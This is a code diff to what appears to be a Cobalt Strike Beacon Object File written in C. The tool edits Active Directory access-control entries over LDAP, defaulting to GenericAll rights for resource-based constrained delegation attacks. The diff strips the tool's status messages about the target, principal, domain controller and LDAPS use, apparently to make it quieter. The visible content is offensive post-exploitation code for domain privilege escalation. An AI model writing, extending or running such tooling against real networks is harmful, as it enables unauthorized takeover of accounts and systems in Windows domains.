@@ -31,8 +31,6 @@ void go(char *args, int alen) {
         return;
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s %s", targetIdentifier, isTargetDN ? "(DN)" : "(name)");
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Principal: %s %s", principalIdentifier, isPrincipalDN ? "(DN)" : "(name)");
     
     // Parse ACE parameters (use defaults if not provided)
     ACCESS_MASK accessMask = GENERIC_ALL; // Default to GenericAll for RBCD
@@ -60,11 +58,9 @@ void go(char *args, int alen) {
     }
     
     if (dcAddress && MSVCRT$strlen(dcAddress) > 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Domain Controller: %s", dcAddress);
     }
     
     if (useLdaps) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using LDAPS (port 636)");
     }
     
     // Initialize LDAP connection
@@ -96,7 +92,6 @@ void go(char *args, int alen) {
         if (targetDN) {
             MSVCRT$strcpy(targetDN, targetIdentifier);
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using provided target DN: %s", targetDN);
     } else {
         
         char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
@@ -110,11 +105,9 @@ void go(char *args, int alen) {
             CleanupLDAP(ld);
             return;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Resolved target DN: %s", targetDN);
     }
     
     // Resolve principal DN and get SID
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Resolving principal information...");
     
     if (isPrincipalDN) {
         size_t len = MSVCRT$strlen(principalIdentifier) + 1;
@@ -122,9 +115,7 @@ void go(char *args, int alen) {
         if (principalDN) {
             MSVCRT$strcpy(principalDN, principalIdentifier);
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using provided principal DN: %s", principalDN);
     } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Resolving principal DN...");
         char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
         principalDN = FindObjectDN(ld, principalIdentifier, searchBase);
         
@@ -434,5 +425,4 @@ cleanup:
     if (targetDN) MSVCRT$free(targetDN);
     CleanupLDAP(ld);
     
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Operation complete");
 }
